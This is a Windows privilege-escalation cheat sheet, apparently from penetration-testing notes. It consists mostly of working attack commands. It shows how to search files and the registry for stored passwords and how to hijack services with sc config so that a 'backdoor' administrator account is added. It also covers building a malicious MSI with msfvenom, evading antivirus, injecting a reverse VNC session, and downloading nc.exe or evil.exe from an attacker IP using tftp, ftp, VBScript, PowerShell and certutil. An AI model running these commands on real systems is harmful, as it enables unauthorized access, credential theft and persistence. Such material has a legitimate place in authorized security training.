# basics_windows_privilege_escalation_guide
# [Windows Privilege Escalation]

## **Information Gathering**

+  **What system are we connected to?**

systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;

+ **Get the hostname and username (if available)**

hostname

echo %username%

+  **Learn about your environment**

SET

echo %PATH%

+  **List other users on the box**

net users

net user \&lt;username\&gt;

+  **Networking/Routing Info**

ipconfig /all

route print

arp -A

+  **Active Network Connections**

netstat -ano

+ **Firewall Status (only on Win XP SP2 and above)**

netsh firewall show state

netsh firewall show config

netsh advfirewall firewall show rule all

+  **Scheduled tasks**

schtasks /query /fo LIST /v

+  **Check how Running processes link to started services**

tasklist /SVC

+  **Windows services that are started:**

net start

+ **Driver madness (3rd party drivers may have holes)**

DRIVERQUERY

+  **Check systeminfo output against exploit-suggester**

https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py

python windows-exploit-suggester.py -d 2017-05-27-mssb.xls -i systeminfo.txt

+  **Run windows-privesc script**

https://github.com/pentestmonkey/windows-privesc-check

## **WMIC**

Windows Management Instrumentation Command Line
Windows XP requires admin
+  **Use wmic\_info.bat script for automation**

http://www.fuzzysecurity.com/tutorials/files/wmic\_info.rar

+  **System Info**

wmic COMPUTERSYSTEM get TotalPhysicalMemory,caption

wmic CPU Get /Format:List

+  **Check patch level**

wmic qfe get Caption,Description,HotFixID,InstalledOn

1. Look for privilege escalation exploits and look up their respective KB patch numbers. Such exploits include, but are not limited to, KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799)
2. After enumerating the OS version and Service Pack you should find out which privilege escalation vulnerabilities could be present. Using the KB patch numbers you can grep the installed patches to see if any are missing
3. Search patches for given patch

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot;

Examples:

Windows 2K SP4 - Windows 7 (x86): KiTrap0D (KB979682)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB979682&quot;

Windows Vista/2008 6.1.6000 x32,Windows Vista/2008 6.1.6001 x32,Windows 7 6.2.7600 x32,Windows 7/2008 R2 6.2.7600 x64. (no good exploit - unlikely Microsoft Windows Vista/7 - Elevation of Privileges (UAC Bypass))

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB2393802&quot;

## **Stored Credentials**

1. Directories that contain the configuration files (however better check the entire filesystem). These files either contain clear-text passwords or in a Base64 encoded format.
2. C:\sysprep.inf
3. C:\sysprep\sysprep.xml
4. %WINDIR%\Panther\Unattend\Unattended.xml

%WINDIR%\Panther\Unattended.xml

1. When the box is connected to a Domain:
  1. Look for Groups.xml in SYSVOL
GPO preferences can be used to create local users on domain. So passwords might be stored there. Any authenticated user will have read access to this file. The passwords is encryptes with AES. But the static key is published on the msdn website. Thus it can be decrypted.
  2. Search for other policy preference files that can have the optional &quot;cPassword&quot; attribute set:
  3. Services\Services.xml: Element-Specific Attributes
  4. ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
  5. Printers\Printers.xml: SharedPrinter Element
  6. Drives\Drives.xml: Element-Specific Attributes

DataSources\DataSources.xml: Element-Specific Attributes

1. Automated Tools
  1. Metasploit Module
  2. post/windows/gather/credentials/gpp

post/windows/gather/enum\_unattend

1.
  1. Powersploit
  2. https://github.com/PowerShellMafia/PowerSploit
  3. Get-GPPPassword
  4. Get-UnattendedInstallFile
  5. Get-Webconfig
  6. Get-ApplicationHost
  7. Get-SiteListPassword
  8. Get-CachedGPPPassword

Get-RegistryAutoLogon

1. Search filesystem:
  1. Search for specific keywords:

dir /s \*pass\* == \*cred\* == \*vnc\* == \*.config\*

1.
  1. Search certain file types for a keyword

findstr /si password \*.xml \*.ini \*.txt

1.
  1. Search for certain files
  2. dir /b /s unattend.xml
  3. dir /b /s web.config
  4. dir /b /s sysprep.inf
  5. dir /b /s sysprep.xml
  6. dir /b /s \*pass\*

dir /b /s vnc.ini

1.
  1. Grep the registry for keywords (e.g. &quot;passwords&quot;)
  2. reg query HKLM /f password /t REG\_SZ /s
  3. reg query HKCU /f password /t REG\_SZ /s
  4. reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;
  5. reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;
  6. reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;

reg query HKEY\_LOCAL\_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

1.
  1. Find writeable files

dir /a-r-d /s /b

1.
  1.
    1. /a is to search for attributes. In this case r is read only and d is directory. The minus signs negate those attributes. So we&#39;re looking for writable files only.
    2. /s means recurse subdirectories
    3. /b means bare format. Path and filename only.

## **Trusted Service Paths**

1. List all unquoted service paths (minus built-in Windows services) on our compromised machine:

wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;

Suppose we found:

C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe

If you look at the registry entry for this service with Regedit you can see the ImagePath value is:

C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe

To be secure it should be like this:

&quot;C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe&quot;

When Windows attempts to run this service, it will look at the following paths in order and will run the first EXE that it will find:

C:\Program.exe

C:\Program Files.exe

C:\Program Files(x86)\Program Folder\A.exe

...

1. Check permissions of folder path

icacls &quot;C:\Program Files (x86)\Program Folder&quot;

1. If we can write in the path we plant a backdoor with the same name with the service and restart the service.

Metasploit module:

exploit/windows/local/trusted\_service\_path

## **Vulnerable Services**

Search for services that have a binary path (binpath) property which can be modified by non-Admin users - in that case change the binpath to execute a command of your own.
Note: Windows XP shipped with several vulnerable built-in services.
Use accesschk from SysInternals to search for these vulnerable services.

https://technet.microsoft.com/en-us/sysinternals/bb842062.aspx

For Windows XP, version 5.2 of accesschk is needed:

https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe

accesschk.exe -uwcqv &quot;Authenticated Users&quot; \* /accepteula

accesschk.exe -qdws &quot;Authenticated Users&quot; C:\Windows\ /accepteula

accesschk.exe -qdws Users C:\Windows\

Then query the service using Windows sc:

sc qc \&lt;vulnerable service name\&gt;

Then change the binpath to execute your own commands (restart of the service will most likely be needed):

sc config \&lt;vuln-service\&gt; binpath= &quot;net user backdoor backdoor123 /add&quot;

sc stop \&lt;vuln-service\&gt;

sc start \&lt;vuln-service\&gt;

sc config \&lt;vuln-service\&gt; binpath= &quot;net localgroup Administrators backdoor /add&quot;

sc stop \&lt;vuln-service\&gt;

sc start \&lt;vuln-service\&gt;

Note - Might need to use the  **depend**  attribute explicitly:

sc stop \&lt;vuln-service\&gt;

sc config \&lt;vuln-service\&gt; binPath= &quot;c:\inetpub\wwwroot\runmsf.exe&quot; depend= &quot;&quot; start= demand obj= &quot;.\LocalSystem&quot; password= &quot;&quot;

sc start \&lt;vuln-service\&gt;

Metasploit module:

exploit/windows/local/service\_permissions

## **AlwaysInstallElevated**

**AlwaysInstallElevated**  is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.
Check if these 2 registry values are set to &quot;1&quot;:

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

If they are, create your own malicious msi:

msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi

Then use msiexec on victim to execute your msi:

msiexec /quiet /qn /i C:\evil.msi

Metasploit module:

exploit/windows/local/always\_install\_elevated

## **Bypassing AV**

- Use Veil-Evasion
- Create your own executable by &quot;compiling&quot; PowerShell scripts
- Use Metasploit to substitute custom EXE and MSI binaries. You can set EXE::Custom or MSI::Custom to point to your binary prior to executing the module.

## **Getting GUI**

+  **Using meterpreter, inject vnc session** :

run post/windows/manage/payload\_inject payload=windows/vncinject/reverse\_tcp lhost=\&lt;yourip\&gt; options=viewonly=false

+  **Enable RDP** :

netsh firewall set service RemoteDesktop enable

reg add &quot;HKEY\_LOCAL\_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t

REG\_DWORD /d 0 /f

reg add &quot;hklm\system\currentControlSet\Control\Terminal Server&quot; /v &quot;AllowTSConnections&quot; /t REG\_DWORD /d 0x1 /f

sc config TermService start= auto

net start Termservice

netsh.exe

firewall

add portopening TCP 3389 &quot;Remote Desktop&quot;

OR:

netsh.exe advfirewall firewall add rule name=&quot;Remote Desktop - User Mode (TCP-In)&quot; dir=in action=allow

program=&quot;%%SystemRoot%%\system32\svchost.exe&quot; service=&quot;TermService&quot; description=&quot;Inbound rule for the

Remote Desktop service to allow RDP traffic. [TCP 3389] added by LogicDaemon&#39;s script&quot; enable=yes

profile=private,domain localport=3389 protocol=tcp

netsh.exe advfirewall firewall add rule name=&quot;Remote Desktop - User Mode (UDP-In)&quot; dir=in action=allow

program=&quot;%%SystemRoot%%\system32\svchost.exe&quot; service=&quot;TermService&quot; description=&quot;Inbound rule for the

Remote Desktop service to allow RDP traffic. [UDP 3389] added by LogicDaemon&#39;s script&quot; enable=yes

profile=private,domain localport=3389 protocol=udp

OR (meterpreter)

run post/windows/manage/enable\_rdp

[https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/](https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/)

## **Python exploits**

Compiling Python Exploits for Windows on Linux

1. install pyinstaller of windows with wine on Kali and then

wine ~/.wine/drive\_c/Python27/Scripts/pyinstaller.exe --onefile 18176.py

1. run `pyinstaller` located under the same directory as Python scripts

wine ~/.wine/drive\_c/Python27/Scripts/pyinstaller.exe --onefile HelloWorld.py

1. Execute with wine

wine ~/.wine/drive\_c/dist/HelloWorld.exe

## **File Transfers**

limit commands on shell to be non-interactive
[https://blog.netspi.com/15-ways-to-download-a-file/](https://blog.netspi.com/15-ways-to-download-a-file/)

### **TFTP**

Windows XP and Win 2003 contain tftp client. Windows 7 do not by default
tfpt clients are usually non-interactive, so they could work through an obtained shell

atftpd --daemon --port 69 /tftp

Windows\&gt; tftp -i 192.168.30.45 GET nc.exe

### **FTP**

Windows contain FTP client but they are usually interactive
Solution: scripted parameters in ftp client: ftp -s
ftp-commands

echo open 192.168.30.5 21\&gt; ftp.txt

echo USER username password \&gt;\&gt; ftp.txt

echo bin \&gt;\&gt; ftp.txt

echo GET evil.exe \&gt;\&gt; ftp.txt

echo bye \&gt;\&gt; ftp.txt

ftp -s:ftp.txt

### **VBScript**

wget-vbs script echo trick again, copy paste the commands in the shell

echo strUrl = WScript.Arguments.Item(0) \&gt; wget.vbs

echo StrFile = WScript.Arguments.Item(1) \&gt;\&gt; wget.vbs

echo Const HTTPREQUEST\_PROXYSETTING\_DEFAULT = 0 \&gt;\&gt; wget.vbs

echo Const HTTPREQUEST\_PROXYSETTING\_PRECONFIG = 0 \&gt;\&gt; wget.vbs

echo Const HTTPREQUEST\_PROXYSETTING\_DIRECT = 1 \&gt;\&gt; wget.vbs

echo Const HTTPREQUEST\_PROXYSETTING\_PROXY = 2 \&gt;\&gt; wget.vbs

echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts \&gt;\&gt; wget.vbs

echo Err.Clear \&gt;\&gt; wget.vbs

echo Set http = Nothing \&gt;\&gt; wget.vbs

echo Set http = [CreateObject](http://www.google.com/search?q=CREATEOBJECT+site:msdn.microsoft.com)(&quot;WinHttp.WinHttpRequest.5.1&quot;) \&gt;\&gt; wget.vbs

echo If http Is Nothing Then Set http = [CreateObject](http://www.google.com/search?q=CREATEOBJECT+site:msdn.microsoft.com)(&quot;WinHttp.WinHttpRequest&quot;) \&gt;\&gt; wget.vbs

echo If http Is Nothing Then Set http = [CreateObject](http://www.google.com/search?q=CREATEOBJECT+site:msdn.microsoft.com)(&quot;MSXML2.ServerXMLHTTP&quot;) \&gt;\&gt; wget.vbs

echo If http Is Nothing Then Set http = [CreateObject](http://www.google.com/search?q=CREATEOBJECT+site:msdn.microsoft.com)(&quot;Microsoft.XMLHTTP&quot;) \&gt;\&gt; wget.vbs

echo http.Open &quot;GET&quot;,strURL,False \&gt;\&gt; wget.vbs

echo http.Send \&gt;\&gt; wget.vbs

echo varByteArray = http.ResponseBody \&gt;\&gt; wget.vbs

echo Set http = Nothing \&gt;\&gt; wget.vbs

echo Set fs = [CreateObject](http://www.google.com/search?q=CREATEOBJECT+site:msdn.microsoft.com)(&quot;Scripting.FileSystemObject&quot;) \&gt;\&gt; wget.vbs

echo Set ts = fs.CreateTextFile(StrFile,True) \&gt;\&gt; wget.vbs

echo strData = &quot;&quot; \&gt;\&gt; wget.vbs

echo strBuffer = &quot;&quot; \&gt;\&gt; wget.vbs

echo For lngCounter = 0 to [UBound](http://www.google.com/search?q=UBOUND+site:msdn.microsoft.com)(varByteArray) \&gt;\&gt; wget.vbs

echo ts.Write [Chr](http://www.google.com/search?q=CHR+site:msdn.microsoft.com)(255 And [Ascb](http://www.google.com/search?q=ASCB+site:msdn.microsoft.com)([Midb](http://www.google.com/search?q=MIDB+site:msdn.microsoft.com)(varByteArray,lngCounter + 1,1))) \&gt;\&gt; wget.vbs

echo Next \&gt;\&gt; wget.vbs

echo ts.Close \&gt;\&gt; wget.vbs

cscript wget.vbs http://10.11.0.102/evil.exe test.txt

### **Powershell**

echo $storageDir = $pwd \&gt; wget.ps1

echo $webclient = New-Object System.Net.WebClient \&gt;\&gt;wget.ps1

echo $url = &quot;http://10.11.0.102/powerup.ps1&quot; \&gt;\&gt;wget.ps1

echo $file = &quot;powerup.ps1&quot; \&gt;\&gt;wget.ps1

echo $webclient.DownloadFile($url,$file) \&gt;\&gt;wget.ps1

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

### **Webdav**

On kali linux install wsgidav and cheroot

pip install wsgidav cheroot

Start the wsgidav on a restricted folder:

mkdir /tmp/webdav\_folder

wsgidav --host=0.0.0.0 --port=80 --root=/tmp/webdav\_folder

On Windows mount this folder using net use:

net use \* http://YOUR\_IP\_ADDRESS/

Reference: [https://github.com/mar10/wsgidav](https://github.com/mar10/wsgidav)

### **BitsAdmin**

bitsadmin /transfer n http://domain/file c:%homepath%file

### **debug.exe**

First use upx or similar to compress the executable:

upx -9 nc.exe

Then use exe2bat to convert the executable into a series of echo commands that are meant to be copied pasted in the remote system:

wine exe2bat.exe nc.exe nc.txt

Then copy paste each command from nc.txt in the remote system. The commands will gradually rebuild the executable in the target machine.

### **certuril**

certutil.exe -URL

will fetch ANY file and download it here:

C:\Users\subTee\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content

## **Resources**

[https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py](https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)
[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
[http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
[https://toshellandback.com/2015/11/24/ms-priv-esc/](https://toshellandback.com/2015/11/24/ms-priv-esc/)
[https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/](https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/)
[https://www.toshellandback.com/2015/08/30/gpp/](https://www.toshellandback.com/2015/08/30/gpp/)
[https://www.toshellandback.com/2015/09/30/anti-virus/](https://www.toshellandback.com/2015/09/30/anti-virus/)
[https://www.veil-framework.com/framework/veil-evasion/](https://www.veil-framework.com/framework/veil-evasion/)
[https://www.toshellandback.com/2015/11/24/ms-priv-esc/](https://www.toshellandback.com/2015/11/24/ms-priv-esc/)
[https://null-byte.wonderhowto.com/how-to/hack-like-pro-use-powersploit-part-1-evading-antivirus-software-0165535/](https://null-byte.wonderhowto.com/how-to/hack-like-pro-use-powersploit-part-1-evading-antivirus-software-0165535/)
[https://pentestlab.blog/2017/04/19/stored-credentials/](https://pentestlab.blog/2017/04/19/stored-credentials/)
